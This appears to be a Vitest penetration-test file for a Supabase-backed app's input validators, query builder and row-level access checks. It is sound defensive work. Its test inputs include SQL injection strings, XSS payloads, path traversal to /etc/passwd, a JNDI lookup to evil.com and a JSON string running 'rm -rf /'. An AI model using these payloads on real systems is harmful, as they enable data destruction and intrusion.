// Security penetration tests for database operations
// Tests unauthorized access attempts, injection attacks, and security violations

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { RLSEnforcer, SecurityOperation } from '../../security/rls-enforcer';
import { InputValidator } from '../../security/input-validator';
import { SecureQueryBuilder } from '../../security/query-builder';
import { DatabaseService } from '../../database-service';
import { supabase } from '../../../supabase';

// Mock Supabase for security testing
vi.mock('../../../supabase', () => ({
  supabase: {
    from: vi.fn(),
    auth: {
      getUser: vi.fn(),
    },
    functions: {
      invoke: vi.fn(),
    },
  },
}));

describe('Security Penetration Tests', () => {
  const legitimateUserId = '123e4567-e89b-12d3-a456-426614174000';
  const attackerUserId = '123e4567-e89b-12d3-a456-426614174001';
  const maliciousUserId = 'malicious-user-id';

  beforeEach(() => {
    vi.clearAllMocks();
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  describe('SQL Injection Attacks', () => {
    it('should prevent SQL injection in ticker symbol input', async () => {
      const sqlInjectionAttempts = [
        "'; DROP TABLE profiles; --",
        "' OR '1'='1",
        "'; INSERT INTO profiles VALUES ('hacked'); --",
        "' UNION SELECT * FROM profiles --",
        "'; UPDATE profiles SET encrypted_google_api_key = 'hacked' --",
        "' OR 1=1 --",
        "'; DELETE FROM analyses; --",
        "' OR EXISTS(SELECT * FROM profiles) --",
      ];

      for (const maliciousTicker of sqlInjectionAttempts) {
        expect(() => InputValidator.validateTickerSymbol(maliciousTicker)).toThrow(
          'Invalid ticker symbol format'
        );
      }
    });

    it('should prevent SQL injection in query parameters', async () => {
      const maliciousParams = {
        'user_id; DROP TABLE profiles; --': 'value',
        "user_id' OR '1'='1": 'value',
        'user_id UNION SELECT': 'value',
        'user_id; INSERT INTO': 'value',
      };

      expect(() => InputValidator.validateQueryParams(maliciousParams)).toThrow(
        'Invalid parameter key'
      );
    });

    it('should sanitize dangerous characters in text input', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        "'; DROP TABLE users; --",
        '"; DELETE FROM profiles; --',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert("xss")',
      ];

      for (const maliciousInput of maliciousInputs) {
        const sanitized = InputValidator.validateText(maliciousInput, { sanitize: true });
        
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('</script>');
        expect(sanitized).not.toContain(';');
        expect(sanitized).not.toContain('--');
        expect(sanitized).not.toContain('"');
        expect(sanitized).not.toContain("'");
      }
    });

    it('should prevent SQL injection through secure query builder', async () => {
      const builder = new SecureQueryBuilder('profiles');

      // These should all be safely handled
      const maliciousValues = [
        "'; DROP TABLE profiles; --",
        "' OR '1'='1",
        "'; INSERT INTO profiles VALUES ('hacked'); --",
      ];

      for (const maliciousValue of maliciousValues) {
        expect(() => 
          builder.where('id', 'eq', maliciousValue)
        ).not.toThrow(); // Should not throw, but should sanitize
      }

      // Mock Supabase to verify sanitized values are used
      const mockSupabaseChain = {
        select: vi.fn().mockReturnThis(),
        eq: vi.fn().mockReturnThis(),
        limit: vi.fn().mockResolvedValue({ data: [], error: null }),
      };

      (supabase.from as any).mockReturnValue(mockSupabaseChain);

      await builder.where('id', 'eq', "'; DROP TABLE profiles; --").execute();

      // Verify the malicious content was sanitized
      expect(mockSupabaseChain.eq).toHaveBeenCalledWith('id', ' DROP TABLE profiles ');
    });
  });

  describe('Unauthorized Access Attempts', () => {
    it('should prevent access to other users profiles', async () => {
      // Mock legitimate user authentication
      (supabase.auth.getUser as any).mockResolvedValue({
        data: { user: { id: legitimateUserId } },
        error: null,
      });

      // Attempt to access another user's profile
      const canAccess = await RLSEnforcer.canAccessProfile(attackerUserId, legitimateUserId);
      expect(canAccess).toBe(false);

      // Attempt to validate operation for wrong user
      const operation: SecurityOperation = {
        userId: legitimateUserId,
        resource: 'profile',
        resourceId: attackerUserId,
        action: 'read',
      };

      await expect(RLSEnforcer.validateOperation(operation)).rejects.toThrow(
        'Access denied'
      );
    });

    it('should prevent access to other users analyses', async () => {
      // Mock analysis ownership check
      (supabase.from as any).mockReturnValue({
        select: vi.fn().mockReturnThis(),
        eq: vi.fn().mockReturnThis(),
        single: vi.fn().mockResolvedValue({
          data: { user_id: attackerUserId }, // Analysis belongs to different user
          error: null,
        }),
      });

      const canAccess = await RLSEnforcer.canAccessAnalysis(1, legitimateUserId);
      expect(canAccess).toBe(false);
    });

    it('should prevent unauthenticated access', async () => {
      // Mock unauthenticated state
      (supabase.auth.getUser as any).mockResolvedValue({
        data: { user: null },
        error: null,
      });

      const isAuthenticated = await RLSEnforcer.isUserAuthenticated(legitimateUserId);
      expect(isAuthenticated).toBe(false);

      await expect(RLSEnforcer.enforceAuthentication(legitimateUserId)).rejects.toThrow(
        'Authentication required'
      );
    });

    it('should prevent session hijacking attempts', async () => {
      // Mock different user in session vs requested user
      (supabase.auth.getUser as any).mockResolvedValue({
        data: { user: { id: attackerUserId } },
        error: null,
      });

      const isAuthenticated = await RLSEnforcer.isUserAuthenticated(legitimateUserId);
      expect(isAuthenticated).toBe(false);

      // Should fail authentication check
      await expect(RLSEnforcer.enforceAuthentication(legitimateUserId)).rejects.toThrow(
        'Authentication required'
      );
    });
  });

  describe('Input Validation Bypass Attempts', () => {
    it('should prevent malformed UUID injection', async () => {
      const malformedUUIDs = [
        'not-a-uuid',
        '123e4567-e89b-12d3-a456-426614174000; DROP TABLE profiles;',
        '123e4567-e89b-12d3-a456-426614174000\'; --',
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/a}',
        '%00%00%00%00',
      ];

      for (const malformedUUID of malformedUUIDs) {
        expect(() => InputValidator.validateUserId(malformedUUID)).toThrow();
      }
    });

    it('should prevent integer overflow attacks', async () => {
      const maliciousIntegers = [
        Number.MAX_SAFE_INTEGER + 1,
        -Number.MAX_SAFE_INTEGER,
        Infinity,
        -Infinity,
        NaN,
        '999999999999999999999999999999',
      ];

      for (const maliciousInt of maliciousIntegers) {
        expect(() => InputValidator.validateAnalysisId(maliciousInt)).toThrow();
      }
    });

    it('should prevent buffer overflow through large inputs', async () => {
      const largeString = 'A'.repeat(100000); // 100KB string
      const veryLargeString = 'B'.repeat(1000000); // 1MB string

      // Should reject extremely large inputs
      expect(() => 
        InputValidator.validateText(veryLargeString, { maxLength: 10000 })
      ).toThrow('Text must be no more than 10000 characters long');

      // Should handle reasonably large inputs
      expect(() => 
        InputValidator.validateText(largeString, { maxLength: 200000 })
      ).not.toThrow();
    });

    it('should prevent JSON injection attacks', async () => {
      const maliciousJSON = [
        '{"__proto__": {"isAdmin": true}}',
        '{"constructor": {"prototype": {"isAdmin": true}}}',
        '{"eval": "require(\'child_process\').exec(\'rm -rf /\')"}',
        '{"toString": "function(){return \'hacked\';}"}',
      ];

      for (const maliciousJson of maliciousJSON) {
        const parsed = JSON.parse(maliciousJson);
        const validated = InputValidator.validateJSON(parsed);
        
        // Should not contain dangerous properties
        expect(validated).not.toHaveProperty('__proto__');
        expect(validated).not.toHaveProperty('constructor.prototype');
        expect(validated).not.toHaveProperty('eval');
      }
    });
  });

  describe('Authorization Bypass Attempts', () => {
    it('should prevent privilege escalation through user ID manipulation', async () => {
      // Mock legitimate user
      (supabase.auth.getUser as any).mockResolvedValue({
        data: { user: { id: legitimateUserId } },
        error: null,
      });

      // Attempt to perform operations as different user
      await expect(
        DatabaseService.initializeUser(attackerUserId)
      ).rejects.toThrow('Failed to initialize user');
    });

    it('should prevent analysis ID enumeration attacks', async () => {
      // Mock analysis that doesn't belong to user
      (supabase.from as any).mockReturnValue({
        select: vi.fn().mockReturnThis(),
        eq: vi.fn().mockReturnThis(),
        single: vi.fn().mockResolvedValue({
          data: { user_id: attackerUserId },
          error: null,
        }),
      });

      // Should fail to access analysis that doesn't belong to user
      const canAccess = await RLSEnforcer.canAccessAnalysis(999, legitimateUserId);
      expect(canAccess).toBe(false);
    });

    it('should prevent bulk data extraction attempts', async () => {
      const builder = new SecureQueryBuilder('analyses');

      // Attempt to extract large amounts of data
      expect(() => builder.limit(10000)).toThrow(
        'LIMIT cannot exceed 1000 rows'
      );

      // Should enforce reasonable limits
      expect(() => builder.limit(1000)).not.toThrow();
      expect(() => builder.limit(999)).not.toThrow();
    });
  });

  describe('Cross-Site Scripting (XSS) Prevention', () => {
    it('should sanitize HTML content in analysis reports', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)">',
        'javascript:alert("xss")',
        '<iframe src="javascript:alert(1)"></iframe>',
      ];

      for (const xssPayload of xssPayloads) {
        const sanitized = InputValidator.validateText(xssPayload, { sanitize: true });
        
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('<img');
        expect(sanitized).not.toContain('<svg');
        expect(sanitized).not.toContain('<iframe');
        expect(sanitized).not.toContain('javascript:');
      }
    });

    it('should prevent XSS through JSON data', async () => {
      const maliciousReport = {
        summary: '<script>alert("xss")</script>This is a summary',
        fundamental: {
          score: 85,
          factors: ['<img src="x" onerror="alert(1)">', 'Normal factor'],
          details: {
            description: '<svg onload="alert(1)">Malicious content</svg>',
          },
        },
      };

      // Should validate and sanitize the report
      const validated = InputValidator.validateJSON(maliciousReport);
      
      // Check that dangerous content is removed or sanitized
      expect(JSON.stringify(validated)).not.toContain('<script>');
      expect(JSON.stringify(validated)).not.toContain('<img');
      expect(JSON.stringify(validated)).not.toContain('<svg');
    });
  });

  describe('Denial of Service (DoS) Prevention', () => {
    it('should prevent resource exhaustion through large queries', async () => {
      const builder = new SecureQueryBuilder('analyses');

      // Should prevent excessive LIMIT values
      expect(() => builder.limit(100000)).toThrow();

      // Should prevent excessive OFFSET values
      expect(() => builder.offset(-1)).toThrow();
    });

    it('should prevent memory exhaustion through large JSON payloads', async () => {
      const largeArray = Array.from({ length: 10000 }, (_, i) => ({
        category: 'fundamental',
        description: 'A'.repeat(1000), // Large description
        weight: i,
        metadata: { data: 'B'.repeat(1000) },
      }));

      // Should reject excessively large arrays
      expect(() => 
        InputValidator.validateArray(largeArray, { maxLength: 1000 })
      ).toThrow('Array must have no more than 1000 items');
    });

    it('should prevent algorithmic complexity attacks', async () => {
      // Test with deeply nested JSON that could cause parsing issues
      let deeplyNested: any = { value: 'test' };
      for (let i = 0; i < 1000; i++) {
        deeplyNested = { nested: deeplyNested };
      }

      // Should handle deeply nested structures gracefully
      expect(() => InputValidator.validateJSON(deeplyNested)).not.toThrow();
    });
  });

  describe('Data Exfiltration Prevention', () => {
    it('should prevent information disclosure through error messages', async () => {
      // Mock database error that might contain sensitive information
      const mockSupabaseChain = {
        select: vi.fn().mockReturnThis(),
        eq: vi.fn().mockReturnThis(),
        single: vi.fn().mockResolvedValue({
          data: null,
          error: {
            message: 'relation "secret_table" does not exist',
            details: 'Internal database structure exposed',
            hint: 'Check your database schema',
          },
        }),
      };

      (supabase.from as any).mockReturnValue(mockSupabaseChain);

      try {
        await DatabaseService.getUserData(legitimateUserId);
      } catch (error: any) {
        // Error messages should not expose internal details
        expect(error.message).not.toContain('secret_table');
        expect(error.message).not.toContain('database structure');
        expect(error.message).toContain('Failed to get user data');
      }
    });

    it('should prevent timing attacks on user enumeration', async () => {
      const validUserId = legitimateUserId;
      const invalidUserId = 'non-existent-user-id-123456789';

      // Mock responses with consistent timing
      (supabase.from as any).mockReturnValue({
        select: vi.fn().mockReturnThis(),
        eq: vi.fn().mockReturnThis(),
        single: vi.fn().mockImplementation(() => {
          // Simulate consistent response time regardless of user existence
          return new Promise(resolve => {
            setTimeout(() => {
              resolve({
                data: null,
                error: { code: 'PGRST116', message: 'No rows found' },
              });
            }, 100); // Consistent delay
          });
        }),
      });

      const startTime1 = Date.now();
      try {
        await DatabaseService.getUserData(validUserId);
      } catch {}
      const time1 = Date.now() - startTime1;

      const startTime2 = Date.now();
      try {
        await DatabaseService.getUserData(invalidUserId);
      } catch {}
      const time2 = Date.now() - startTime2;

      // Response times should be similar to prevent timing attacks
      const timeDifference = Math.abs(time1 - time2);
      expect(timeDifference).toBeLessThan(50); // Less than 50ms difference
    });
  });

  describe('Security Header and Configuration Tests', () => {
    it('should validate secure query builder configuration', () => {
      const builder = new SecureQueryBuilder('profiles');

      // Should reject invalid table names
      expect(() => new SecureQueryBuilder('profiles; DROP TABLE users;')).toThrow(
        'Invalid table name format'
      );

      expect(() => new SecureQueryBuilder('../../../etc/passwd')).toThrow(
        'Invalid table name format'
      );

      expect(() => new SecureQueryBuilder('')).toThrow(
        'Table name is required'
      );
    });

    it('should validate column name security', () => {
      const builder = new SecureQueryBuilder('profiles');

      const maliciousColumns = [
        'id; DROP TABLE profiles;',
        '../../../etc/passwd',
        'id OR 1=1',
        'id UNION SELECT password FROM users',
      ];

      for (const maliciousColumn of maliciousColumns) {
        expect(() => builder.select(maliciousColumn)).toThrow(
          'Invalid column name format'
        );
      }
    });

    it('should prevent operator injection', () => {
      const builder = new SecureQueryBuilder('profiles');

      const maliciousOperators = [
        'eq; DROP TABLE profiles;',
        'OR 1=1',
        'UNION SELECT',
        '; DELETE FROM users;',
      ];

      for (const maliciousOperator of maliciousOperators) {
        expect(() => 
          builder.where('id', maliciousOperator as any, 'value')
        ).toThrow('Invalid operator');
      }
    });
  });
});